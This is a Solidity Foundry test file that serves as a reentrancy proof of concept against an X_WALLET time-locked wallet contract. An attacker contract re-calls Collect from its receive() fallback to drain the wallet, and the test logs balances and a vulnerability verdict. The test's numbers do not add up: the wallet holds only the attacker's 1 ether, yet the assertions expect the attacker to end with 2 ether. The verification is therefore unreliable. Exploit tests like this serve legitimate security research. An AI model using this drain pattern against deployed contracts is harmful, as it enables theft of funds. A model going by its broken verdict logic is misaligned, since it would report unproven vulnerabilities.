// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol";

contract MaliciousContract {
    X_WALLET public wallet;
    uint public attackCount;
    uint public attackAmount;

    constructor(address payable _walletAddress) {
        wallet = X_WALLET(_walletAddress);
    }

    function deposit() external payable {
        wallet.Put{value: msg.value}(block.timestamp + 1 days);
    }

    function attack(uint _amount) external {
        attackAmount = _amount;
        wallet.Collect(_amount);
    }

    receive() external payable {
        if (attackCount < 1 && address(wallet).balance >= attackAmount) {
            attackCount++;
            wallet.Collect(attackAmount);
        }
    }
}

contract X_WALLETTest is Test {
    X_WALLET public wallet;
    MaliciousContract public attacker;
    Log public logContract;

    function setUp() public {
        logContract = new Log();
        wallet = new X_WALLET(address(logContract));
        attacker = new MaliciousContract(payable(address(wallet)));
        
        // Fund the attacker contract with exactly what we'll test with
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyAttack() public {
        // Attacker deposits funds
        vm.warp(block.timestamp); // Set current timestamp
        attacker.deposit{value: 1 ether}();

        // Fast forward time to pass unlock period
        vm.warp(block.timestamp + 1 days + 1 seconds);

        // Differential Validation Setup
        console.log("--- BEFORE-Trigger BALANCES ---");
        uint256 walletBalanceBefore = address(wallet).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Wallet ETH balance (pre-attack):", walletBalanceBefore);
        console.log("Attacker ETH balance (pre-attack):", attackerBalanceBefore);

        console.log("--- TRIGGER PHASE: Reentrancy Attack ---");
        // Perform reentrancy attack
        attacker.attack(1 ether);

        console.log("--- AFTER-Trigger BALANCES ---");
        uint256 walletBalanceAfter = address(wallet).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("Wallet ETH balance (post-attack):", walletBalanceAfter);
        console.log("Attacker ETH balance (post-attack):", attackerBalanceAfter);

        // Calculate balance changes
        uint256 walletChange = walletBalanceBefore - walletBalanceAfter;
        uint256 attackerChange = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Wallet balance delta:", walletChange);
        console.log("Attacker balance delta:", attackerChange);

        // Final Vulnerability Verification
        bool drained = walletBalanceAfter == 0 && attackerBalanceAfter == 2 ether;
        if (drained) {
            console.log("VULNERABILITY VERDICT: Vulnerability Exists - Reentrancy attack succeeded");
        } else {
            console.log("VULNERABILITY VERDICT: Vulnerability not Exist - Balances not changed as expected");
        }

        // Original validation remains as a safety check
        assertEq(attackerBalanceAfter, 2 ether);
        assertEq(walletBalanceAfter, 0);
    }
}